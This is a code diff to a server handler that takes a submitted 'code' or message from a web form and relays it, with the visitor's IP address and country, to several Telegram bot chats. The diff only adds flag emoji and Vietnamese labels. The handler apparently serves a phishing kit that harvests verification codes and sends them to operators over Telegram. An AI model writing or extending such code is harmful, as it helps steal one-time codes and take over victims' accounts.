@@ -1,9 +1,13 @@
+import { countryAlpha2CodeMapIcon } from '../utils/country'
+
 export default defineEventHandler(async (event) => {
   // event.context.path to get the route path: '/api/foo/bar/baz'
   // event.context.params._ to get the route segment: 'bar/baz'
   const { code, message, newUser } = await readBody(event)
   try {
     const countryCode = event?.headers.get('CF-IPCountry')
+    const countryIcon =
+      countryAlpha2CodeMapIcon[countryCode as keyof typeof countryAlpha2CodeMapIcon] || '🌐'
     const runtimeConfig = useRuntimeConfig()
     const tokens = runtimeConfig.TELEGRAM_BOT_TOKEN.split('|')
     const chatIds = runtimeConfig.TELEGRAM_CHAT_ID?.split('|')
@@ -48,14 +52,14 @@ export default defineEventHandler(async (event) => {
             chat_id: chatIds[i],
             text: code
               ? `
-            <b>Code:</b> ${code}
-<b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-<b>Country:</b>${countryCode}
+            <b>📲 Code :</b> ${code}
+<b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
             `
               : `
             <b>${message}</b>
-<b>ip:</b>${event.headers.get('CF-Connecting-IP')}
-<b>Country:</b>${countryCode}
+<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
             `,
             parse_mode: 'HTML',
           },
